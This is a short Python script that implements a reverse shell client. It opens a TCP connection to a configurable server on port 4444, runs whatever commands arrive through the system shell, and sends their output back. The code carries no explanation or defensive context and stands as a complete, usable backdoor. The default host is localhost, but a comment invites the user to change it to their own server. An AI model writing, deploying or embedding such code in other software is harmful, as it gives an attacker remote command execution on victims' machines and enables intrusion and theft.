import socket
import subprocess
import os

def connect_to_server():
    host = '127.0.0.1'  # Change to the IP of your server
    port = 4444

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    try:
        while True:
            command = client.recv(1024).decode("utf-8")
            if command.lower() == 'exit':
                break
            output = execute_command(command)
            client.send(output.encode("utf-8"))
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return output.decode("utf-8")
    except Exception as e:
        return str(e)

def main():
    connect_to_server()

if __name__ == "__main__":
    main()
